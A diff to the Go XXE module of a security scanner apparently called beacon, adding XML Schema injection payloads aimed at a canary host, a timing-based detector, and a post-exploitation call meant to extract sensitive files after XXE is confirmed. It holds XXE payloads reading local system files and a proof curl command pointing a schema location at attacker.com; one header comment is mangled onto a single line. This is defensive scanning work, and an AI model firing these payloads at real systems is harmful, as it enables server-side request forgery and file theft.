@@ -1,5 +1,4 @@
-// Package xxe probes XML-accepting endpoints for XML External Entity (XXE)
-// injection vulnerabilities.
+// Package xxe probes XML-accepting endpoints for XML External Entity (XXE)// injection vulnerabilities.
 //
 // It discovers XML endpoints by probing common API paths with a Content-Type
 // of application/xml or text/xml, then injects XXE payloads and checks whether
@@ -18,11 +17,23 @@ import (
 	"strings"
 	"time"
 
+	"github.com/stormbane-security/beacon/internal/scan"
 	"github.com/stormbane-security/beacon/internal/finding"
 	"github.com/stormbane-security/beacon/internal/module"
 	"github.com/stormbane-security/beacon/internal/scanner/schemedetect"
 )
 
+
+func init() {
+	scan.RegisterWithCheckDecls(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
+		return New()
+	},
+		scan.Check(finding.CheckExploitCredentialHarvest, finding.SeverityCritical, finding.ModeDeep),
+		scan.Check(finding.CheckExploitDataExtracted, finding.SeverityCritical, finding.ModeDeep),
+		scan.Check(finding.CheckWebXSDInjection, finding.SeverityCritical, finding.ModeDeep),
+		scan.Check(finding.CheckWebXXE, finding.SeverityCritical, finding.ModeDeep),
+	)
+}
 const (
 	scannerName = "xxe"
 	maxBodySize = 64 * 1024
@@ -51,6 +62,29 @@ var xxePayloads = []struct {
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
 <root><data>&xxe;</data></root>`,
 		indicator: "[fonts]",
+	},
+}
+
+// xsdPayloads test for XSD (XML Schema) injection via remote schema loading.
+// If the server fetches the remote schema, it confirms SSRF via XML parsing.
+var xsdPayloads = []struct {
+	name    string
+	payload string
+}{
+	{
+		name: "XSD import remote schema",
+		payload: `<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xsi:noNamespaceSchemaLocation="http://xsd-canary.beacon.invalid/schema.xsd">
+<data>test</data></root>`,
+	},
+	{
+		name: "XSD schemaLocation",
+		payload: `<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns="http://example.com/ns"
+      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xsi:schemaLocation="http://example.com/ns http://xsd-canary.beacon.invalid/schema.xsd">
+<data>test</data></root>`,
 	},
 }
 
@@ -116,6 +150,9 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 			f := probeXXE(ctx, client, asset, endpoint, p.name, p.payload, p.indicator)
 			if f != nil {
 				findings = append(findings, *f)
+				// Post-exploitation: extract sensitive files + SSRF
+				postFindings := postExploit(ctx, client, asset, endpoint, "application/xml")
+				findings = append(findings, postFindings...)
 				// One finding per endpoint is sufficient.
 				break
 			}
@@ -125,7 +162,103 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 		}
 	}
 
+	// XSD injection: detect via response timing. If the server attempts to
+	// fetch the remote schema, the request takes longer (DNS resolution +
+	// connection timeout to non-existent host).
+	for _, endpoint := range xmlEndpoints {
+		if ctx.Err() != nil {
+			break
+		}
+		for _, xsd := range xsdPayloads {
+			f := probeXSD(ctx, client, asset, endpoint, xsd.name, xsd.payload)
+			if f != nil {
+				findings = append(findings, *f)
+				break
+			}
+		}
+	}
+
 	return findings, nil
+}
+
+// probeXSD sends an XSD injection payload and detects schema fetching via timing.
+// If the server takes significantly longer to respond (>2s vs baseline), it's
+// likely attempting to resolve the canary domain, confirming SSRF via XML parsing.
+func probeXSD(ctx context.Context, client *http.Client, asset, url, payloadName, payload string) *finding.Finding {
+	// Baseline: send a normal XML document and measure response time.
+	baseReq, err := http.NewRequestWithContext(ctx, http.MethodPost, url,
+		bytes.NewBufferString(xmlProbeBody))
+	if err != nil {
+		return nil
+	}
+	baseReq.Header.Set("Content-Type", "application/xml")
+	baseStart := time.Now()
+	baseResp, err := client.Do(baseReq)
+	if err != nil {
+		return nil
+	}
+	io.Copy(io.Discard, baseResp.Body)
+	baseResp.Body.Close()
+	baseLatency := time.Since(baseStart)
+
+	// XSD probe: send the schema injection payload.
+	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url,
+		bytes.NewBufferString(payload))
+	if err != nil {
+		return nil
+	}
+	req.Header.Set("Content-Type", "application/xml")
+	xsdStart := time.Now()
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil
+	}
+	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
+	resp.Body.Close()
+	xsdLatency := time.Since(xsdStart)
+
+	// If XSD response is >2s slower than baseline, the server likely attempted
+	// to fetch the remote schema (DNS resolution + connection timeout).
+	timeDelta := xsdLatency - baseLatency
+	if timeDelta < 2*time.Second {
+		// Check if the response body mentions the canary domain — some parsers
+		// include error messages about failed schema fetches. Only match our
+		// specific canary, not the generic word "schema" which is too broad
+		// (appears in JSON Schema, GraphQL, database schema references, etc.).
+		bodyStr := strings.ToLower(string(body))
+		if !strings.Contains(bodyStr, "xsd-canary.beacon.invalid") {
+			return nil
+		}
+	}
+
+	return &finding.Finding{
+		CheckID:  finding.CheckWebXSDInjection,
+		Module:   "deep",
+		Scanner:  scannerName,
+		Severity: finding.SeverityHigh,
+		Title:    fmt.Sprintf("XML Schema (XSD) Injection — %s", payloadName),
+		Description: fmt.Sprintf(
+			"The endpoint %s attempts to fetch remote XML Schema (XSD) references embedded in "+
+				"submitted XML documents. An attacker can use this to perform SSRF by pointing "+
+				"schema locations to internal services, or to exfiltrate data via DNS/HTTP callbacks "+
+				"to attacker-controlled servers.",
+			url),
+		Asset:    asset,
+		DeepOnly: true,
+		ProofCommand: fmt.Sprintf(
+			`curl -s -X POST '%s' -H 'Content-Type: application/xml' `+
+				`-d '<?xml version="1.0"?><root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" `+
+				`xsi:noNamespaceSchemaLocation="http://attacker.com/schema.xsd"><data>test</data></root>'`,
+			url),
+		Evidence: map[string]any{
+			"url":            url,
+			"payload":        payloadName,
+			"base_latency":   baseLatency.Milliseconds(),
+			"xsd_latency":    xsdLatency.Milliseconds(),
+			"timing_delta_ms": timeDelta.Milliseconds(),
+		},
+		DiscoveredAt: time.Now(),
+	}
 }
 
 // discoverXMLEndpoints finds paths that respond to XML POST requests.
@@ -144,6 +277,7 @@ func discoverXMLEndpoints(ctx context.Context, client *http.Client, base string)
 			if err != nil {
 				continue
 			}
+			io.Copy(io.Discard, io.LimitReader(resp.Body, 1024)) //nolint:errcheck
 			resp.Body.Close()
 
 			// Accept any 2xx non-HTML response as a potential XML endpoint.
